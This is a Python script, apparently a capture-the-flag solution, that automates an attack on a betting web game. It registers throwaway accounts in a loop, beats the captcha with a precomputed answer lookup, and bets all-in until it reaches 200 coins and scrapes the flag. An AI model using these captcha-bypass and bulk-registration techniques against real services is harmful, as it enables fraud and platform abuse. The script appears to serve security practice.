import requests
import re
import json
import random
import time

URL = 'http://34.159.121.241:31039'

with open('captcha_solutions.json') as f:
    solutions = json.load(f)

def solve_captcha(captcha_text):
    """Look up the visual answer for a captcha expression"""
    captcha_text = captcha_text.strip()
    if captcha_text in solutions:
        return solutions[captcha_text]
    # Try with leading zeros
    parts = captcha_text.split('+')
    if len(parts) == 2:
        key = f"{int(parts[0]):d}+{int(parts[1]):d}"
        if key in solutions:
            return solutions[key]
    return None

def get_captcha_and_coins(session):
    """Get the game page, extract captcha and current coins"""
    r = session.get(f'{URL}/game')
    captcha_match = re.search(r'<div class="captcha-container">\s*(.*?)\s*</div>', r.text, re.DOTALL)
    coins_match = re.search(r'COINS:\s*(\d+)', r.text)
    captcha = captcha_match.group(1).strip() if captcha_match else None
    coins = int(coins_match.group(1)) if coins_match else 0
    return captcha, coins, r.text

def play_round(session, bet, captcha_answer):
    """Submit a bet with captcha answer"""
    r = session.post(f'{URL}/game', data={
        'bet': bet,
        'captcha_answer': captcha_answer
    }, allow_redirects=True)
    
    flash_matches = re.findall(r'\[SYSTEM\]:\s*(.*?)</div>', r.text)
    coins_match = re.search(r'COINS:\s*(\d+)', r.text)
    coins = int(coins_match.group(1)) if coins_match else 0
    flag_match = re.search(r'FLAG:\s*(.*?)</p>', r.text)
    flag = flag_match.group(1).strip() if flag_match else None
    
    return coins, flash_matches, flag

attempt = 0
while True:
    attempt += 1
    s = requests.Session()
    username = f'bot_{random.randint(100000,999999)}'
    s.post(f'{URL}/register', data={'username': username, 'password': 'p'}, allow_redirects=True)
    
    print(f"\n--- Attempt {attempt} (user: {username}) ---")
    
    wins = 0
    coins = 1
    failed = False
    
    while coins < 200 and coins > 0:
        captcha, coins, page = get_captcha_and_coins(s)
        
        if not captcha:
            print("  Failed to get captcha")
            failed = True
            break
        
        answer = solve_captcha(captcha)
        if answer is None:
            print(f"  Unknown captcha: {captcha}")
            failed = True
            break
        
        # Check for flag already
        flag_match = re.search(r'FLAG:\s*(.*?)</p>', page)
        if flag_match:
            print(f"\n*** FLAG FOUND: {flag_match.group(1).strip()} ***")
            exit(0)
        
        bet = coins  # always go all-in
        new_coins, flashes, flag = play_round(s, bet, answer)
        
        if flag:
            print(f"\n*** FLAG FOUND: {flag} ***")
            exit(0)
        
        result = "WIN" if new_coins > coins else "LOSE"
        if new_coins > coins:
            wins += 1
        else:
            wins = 0
        
        print(f"  {captcha} -> {answer} | bet={bet} | {result} | coins: {coins}->{new_coins} | streak: {wins}")
        coins = new_coins
        
        if coins == 0:
            print("  Broke! Re-registering...")
            break
    
    if coins >= 200:
        # Get the flag
        captcha, coins, page = get_captcha_and_coins(s)
        flag_match = re.search(r'FLAG:\s*(.*?)</p>', page)
        if flag_match:
            print(f"\n*** FLAG FOUND: {flag_match.group(1).strip()} ***")
            exit(0)
        else:
            print(f"  Coins: {coins} but no flag visible. Page snippet:")
            print(page[:1000])
